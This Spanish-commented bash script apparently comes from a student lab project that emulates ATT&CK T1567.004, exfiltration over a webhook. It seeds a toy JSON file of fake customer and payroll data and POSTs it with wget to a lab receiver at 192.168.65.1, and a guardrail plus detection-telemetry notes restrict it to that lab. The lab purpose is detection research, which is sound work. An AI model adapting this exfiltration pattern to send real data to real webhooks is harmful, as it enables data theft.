#!/usr/bin/env bash
# ============================================================================
# ATA043 · T1567.004 Exfiltration Over Webhook — ataque MANUAL (TFG)
# ----------------------------------------------------------------------------
# Tecnica : T1567.004 Exfiltration Over Webhook (tactica Exfiltration). Publica
#           el dato robado en un ENDPOINT WEBHOOK local, como haria un actor que
#           envia a un canal de mensajeria (Slack/Teams/Discord)-like.
# Fuente  : custom (escrito por el TFG; ART trae pruebas Windows/Linux)
# Objetivo: enviar el dato simulado como JSON (POST) al endpoint webhook LOCAL
#           del receptor del HOST (`/hook`), distinto de ATA009 (/api/upload) y
#           ATA010 (/c2/beacon).
# Destino : http://192.168.65.1:9090/hook (receptor del HOST, VMnet1)
# Ejecuta : desde /home/angel/lab-attack/ATA043 (cwd del ataque -> ancla H4)
# Elevacion: NO (usuario angel). No se instala nada.
#
# ⚠️ REQUISITO: el receptor (Soporte/Ataques/receiver/sink_http.py) debe estar
#    LEVANTADO en el HOST antes de t0 (ver README §9). La prueba de que el dato
#    SALIO es la linea `POST /hook ... sha256=<H>` del `sink.log` con <H> == sha256
#    del cuerpo JSON enviado.
#
# GUARDARRAILES (abortan si no se cumplen):
#   - el endpoint DEBE apuntar al receptor del laboratorio (192.168.65.1:9090);
#   - solo se escribe en $HOME/lab-attack/ATA043; datos de juguete.
#
# Telemetria esperada (ver README §5):
#   - execve de wget (POST del JSON al webhook) -> 80792 (deteccion; T1567.004-S1).
#   - ancla H4 `audit_cwd=/home/angel/lab-attack/ATA043/*` (T1567.004-S2).
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA043"
PAYLOAD="${BASE}/webhook_payload.json"
HOST="192.168.65.1"
PORT="9090"
ENDPOINT="http://${HOST}:${PORT}/hook"

echo "ATA043 · T1567.004 Exfiltration Over Webhook (wget POST JSON a /hook) — custom"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones (fallan ruidosamente, sin tocar nada) ---
if [ ! -d "$BASE" ]; then
  echo "ERROR: no existe $BASE (¿scp del directorio de la tecnica?)" >&2
  exit 1
fi
if ! command -v wget >/dev/null 2>&1; then
  echo "ERROR: wget no disponible" >&2
  exit 1
fi

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

# GUARDARRAIL: el destino DEBE ser el receptor del laboratorio (VMnet1 del host).
case "$ENDPOINT" in
  "http://192.168.65.1:9090/"*) : ;;
  *) echo "ERROR: endpoint '$ENDPOINT' fuera del receptor del laboratorio (abortado)" >&2; exit 1 ;;
esac

# 0) SIEMBRA del payload del webhook (datos de juguete; builtin printf -> sin execve).
if [ ! -f "$PAYLOAD" ]; then
  {
    printf '{"event":"export.update","source":"victima-linux","attachments":['
    printf '{"name":"clientes.csv","rows":3,"facturacion_eur":319851.25},'
    printf '{"name":"nominas.csv","rows":2,"bruto_eur":6100.00}'
    printf ']}'
  } > "$PAYLOAD"
fi

echo "--- PAYLOAD JSON (a enviar) ---"
sha256sum "$PAYLOAD"
echo "bytes_payload=$(stat -c %s "$PAYLOAD")"

# 1) EXFILTRACION por WEBHOOK: POST del JSON al endpoint local (execve de wget).
wget --quiet --timeout=10 --tries=1 \
  --header='Content-Type: application/json' \
  --post-file="$PAYLOAD" \
  --output-document=/dev/null \
  "$ENDPOINT" && echo "POST /hook -> OK" || echo "POST /hook -> FALLO" >&2

# 2) PRUEBA DE EFECTO (local): sha256 del cuerpo JSON realmente enviado.
s_payload=$(sha256sum "$PAYLOAD" | awk '{print $1}')
echo "sha256 enviado (json) = $s_payload"

echo "--- estado final ---"
ls -l "$PAYLOAD"
if [ -n "$s_payload" ]; then
  echo "WEBHOOK=OK (payload JSON enviado a ${ENDPOINT})"
else
  echo "WEBHOOK=FALLO" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
